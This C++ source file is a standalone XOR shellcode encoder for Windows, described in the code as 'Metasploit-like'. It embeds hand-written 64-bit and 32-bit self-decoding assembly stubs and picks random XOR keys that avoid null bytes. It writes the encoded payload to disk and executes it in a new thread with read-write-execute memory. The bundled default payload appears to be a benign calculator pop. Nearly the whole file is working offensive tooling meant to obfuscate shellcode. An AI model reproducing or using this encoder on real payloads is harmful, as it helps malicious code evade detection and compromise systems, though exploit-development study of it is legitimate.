#include <windows.h>
#include <time.h>
#include <iostream>

#include "pop_calc_shc.h"

unsigned char enc_stub64[] = {
    0x48, 0x31, 0xC9, // xor rcx, rcx
    0x48, 0x81, 0xE9, 0x45, 0xFF, 0xFF, 0xFF, // sub rcx, 0xffffffffffffff45 //~(shellcode_size/sizeof(uint64_t))
    0x48, 0x8D, 0x05, 0xEF, 0xFF, 0xFF, 0xFF, // lea rax, [rip + 0xffffffffffffffef]
    0x48, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // mov rbx , [xor_key]
    0x48, 0x31, 0x58, 0x25, // decode: xor qword ptr [rax+0x25], rbx
    0x48, 0x83, 0xE8, 0xF8, // sub rax, 0xfffffffffffffff8
    0xE2, 0xF6, // loop decode
};

unsigned char enc_stub32[] = {
    0xEB, 0x03, //jmp _start
    0x58, // fetchIP: pop eax
    0xFF, 0xE0, // jmp eax
    0x31, 0xC9, // _start: xor ecx, ecx
    0x81, 0xE9, 0x45, 0xFF, 0xFF, 0xFF, // sub rcx, 0xffffff45 //~(shellcode_size/sizeof(uint64_t)) -> offset: 9
    0xE8, 0xF0, 0xFF,0xFF, 0xFF, //call fetchIP
    0xBB, 0x78, 0x56, 0x34, 0x12, // mov ebx, [xor_key] -> offset: 19
    0x31, 0x58, 0x0D, //decode: xor dword ptr ds:[eax+0xD],ebx
    0x83, 0xE8, 0xFC, // sub eax,FFFFFFFC
    0xE2, 0xF8, // loop decode
};
//EB 03 58 FF E0 31 C9 81 E9 78 56 34 12 E8 F0 FF FF FF BB 78 56 34 12 31 58 0D 83 E8 FC E2 F8

template <class KEY_TYPE>
void xor_data(void* data, size_t data_size, KEY_TYPE key)
{
    KEY_TYPE* dataq = (KEY_TYPE*)data;
    size_t sizeq = data_size / sizeof(KEY_TYPE);
    for (size_t i = 0; i < sizeq; i++) {
        dataq[i] ^= key;
    }
}

bool dump_to_file(BYTE* data, size_t data_size, const char* filename)
{
    FILE* fp = fopen(filename, "wb");
    if (!fp) return false;
    fwrite(data, 1, data_size, fp);
    fclose(fp);
    return true;
}

BYTE* load_from_file(const char* filename, size_t &data_size)
{
    FILE* fp = fopen(filename, "rb");
    if (!fp) return nullptr;

    fseek(fp, 0, SEEK_END);
    size_t fsize = ftell(fp);
    BYTE* data = (BYTE*)::calloc(fsize, 1);
    if (!data) return nullptr;

    fseek(fp, 0, SEEK_SET);
    data_size = fsize;
    fread(data, 1, data_size, fp);
    fclose(fp);
    return data;
}

bool test_shellc(void* exec, size_t exec_size)
{
    DWORD oldprotect = 0;
    if (!VirtualProtect(exec, exec_size, PAGE_EXECUTE_READWRITE, &oldprotect)) {
        std::cerr << "ERROR: VirtualProtect failed!\n";
        return false;
    }
    std::cout << "Running in the new thread: " << std::hex << exec << "\n";
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    if (!th || th == INVALID_HANDLE_VALUE) {
        std::cerr << "ERROR: Creating thread failed!\n";
        return false;
    }
    WaitForSingleObject(th, INFINITE);
    std::cout << "Shellcode finished cleanly\n";
    return true;
}

template <class KEY_TYPE>
bool try_xor_data(void* data, size_t data_len, BYTE* payload, size_t payload_size, KEY_TYPE enc_key)
{
    ::memcpy(data, payload, payload_size);
    xor_data(data, data_len, enc_key);
#ifdef USE_WCHAR
    size_t data_strlen = wcslen((wchar_t*)data) * sizeof(wchar_t);
#else
    size_t data_strlen = strlen((char*)data);
#endif
    if (data_strlen >= payload_size) {
#ifdef _DEBUG
        std::cout << "XOR encoding successful " << std::dec << data_strlen << " vs original len: " << payload_size << std::endl;
#endif
        return true;
    }
#ifdef _DEBUG
    std::cout << "XOR encoding failed: " << std::dec << data_strlen << " vs original len: " << payload_size << std::endl;
#endif
    return false;
}

bool generate_key(void* key_ptr, size_t key_len)
{
    srand(time(NULL));
    int val = rand();
    return false;
}

BYTE* encode_shellc64(BYTE *payload, size_t payload_size, size_t &encoded_size)
{
    uint32_t* shellc_size = (uint32_t*)((ULONG_PTR)enc_stub64 + 6);
    size_t rounded_len = (payload_size / sizeof(uint64_t));
    if ((payload_size % sizeof(uint64_t)) > 1) rounded_len++;

    *shellc_size = ~(rounded_len);
    std::cout << "Shellc Size: 0x" << std::hex << ~(*shellc_size) << " = " << std::dec << ~(*shellc_size) << "\n";

    size_t data_len = rounded_len * sizeof(uint64_t);
    void* data = VirtualAlloc(0, data_len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        return nullptr;
    }

    uint64_t* xor_key = (uint64_t*)((ULONG_PTR)enc_stub64 + 19);
    uint64_t enc_key = ~(1);
    srand(time(nullptr));
    do {
        enc_key *= rand();
        enc_key += rand();
        *xor_key = enc_key;
#ifdef _DEBUG
        std::cout << "xor_key: " << std::hex << (*xor_key) << "\n";
#endif
    } while (!try_xor_data(data, data_len, payload, payload_size, enc_key));

    std::cout << "xor_key: " << std::hex << (*xor_key) << "\n";

    const size_t stub_size = sizeof(enc_stub64);
    const size_t exec_size = data_len + stub_size;
    BYTE* exec = (BYTE*)VirtualAlloc(0, exec_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    encoded_size = exec_size;
    RtlMoveMemory(exec, enc_stub64, stub_size);
    RtlMoveMemory((void*)((ULONG_PTR)exec + stub_size), data, data_len);
    VirtualFree(data, 0, MEM_RELEASE);
    return exec;
}

BYTE* encode_shellc32(BYTE* payload, size_t payload_size, size_t& encoded_size)
{
    uint32_t* shellc_size = (uint32_t*)((ULONG_PTR)enc_stub32 + 9);
    size_t rounded_len = (payload_size / sizeof(uint64_t));
    if ((payload_size % sizeof(uint64_t)) > 1) rounded_len++;

    *shellc_size = ~(rounded_len);
    std::cout << "Shellc Size: 0x" << std::hex << ~(*shellc_size) << " = " << std::dec << ~(*shellc_size) << "\n";

    size_t data_len = rounded_len * sizeof(uint64_t);
    void* data = VirtualAlloc(0, data_len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        return nullptr;
    }

    uint32_t* xor_key = (uint32_t*)((ULONG_PTR)enc_stub32 + 19);
    uint32_t enc_key = ~(1);
    srand(time(nullptr));
    do {
        enc_key *= rand();
        enc_key += rand();
        *xor_key = enc_key;
#ifdef _DEBUG
        std::cout << "xor_key: " << std::hex << (*xor_key) << "\n";
#endif
    } while (!try_xor_data(data, data_len, payload, payload_size, enc_key));

    std::cout << "xor_key: " << std::hex << (*xor_key) << "\n";

    const size_t stub_size = sizeof(enc_stub32);
    const size_t exec_size = data_len + stub_size;
    BYTE* exec = (BYTE*)VirtualAlloc(0, exec_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    encoded_size = exec_size;
    RtlMoveMemory(exec, enc_stub32, stub_size);
    RtlMoveMemory((void*)((ULONG_PTR)exec + stub_size), data, data_len);
    VirtualFree(data, 0, MEM_RELEASE);
    return exec;
}

int main(int argc, char *argv[])
{
    size_t payload_len = 0;
    BYTE* payload = nullptr;

    std::cout << "Standalone Metasploit-like XOR encoder ";
#ifdef _WIN64
    std::cout << "(for 64-bit shellcodes)";
    payload_len = g_payload_len64;
    payload = g_payload64;
#else
    std::cout << "(for 32-bit shellcodes)";
#endif
    std::cout << std::endl;

    if (argc < 2) {
        std::cout << "Args: <shellcode file>\n";
        std::cout << "Shellcode not supplied, using default\n";
        //return 0;
    }
    else {
        const char* filename = argv[1];
        payload = load_from_file(filename, payload_len);
        if (!payload) {
            std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
            return -1;
        }
        std::cout << "Loaded: " << std::dec << payload_len << std::endl;
    }
    size_t exec_size = 0;
    BYTE* exec = nullptr;
#ifdef _WIN64
    exec = encode_shellc64(payload, payload_len, exec_size);
#else
    exec = encode_shellc32(payload, payload_len, exec_size);
#endif
    if (!exec) {
        std::cerr << "Encoding failed!\n";
        return -2;
    }
    const char* filename2 = "encoded_shc.bin";
    if (dump_to_file((BYTE*)exec, exec_size, filename2)) {
        std::cout << "Encoded shellcode dumped to: " << filename2 << "\n";
    }
    test_shellc(exec, exec_size);
    return 0;
}
